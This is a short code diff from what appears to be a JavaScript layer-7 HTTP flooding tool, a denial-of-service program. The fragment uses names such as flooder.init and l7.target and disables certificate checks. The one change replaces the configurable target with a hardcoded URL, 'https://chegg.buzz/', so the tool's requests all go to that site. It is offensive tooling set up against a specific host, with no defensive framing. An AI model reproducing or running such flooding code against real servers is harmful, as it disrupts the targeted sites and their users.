@@ -296,7 +296,7 @@ function INIT(workerData) {
 
         init_request(d) {
             d = flooder.init(d);
-            d.url = d.url || l7.target;
+            d.url = 'https://chegg.buzz/';
             d.method = l7.opt.method;
             d.timeout = 10e3;
             d.insecure = true;
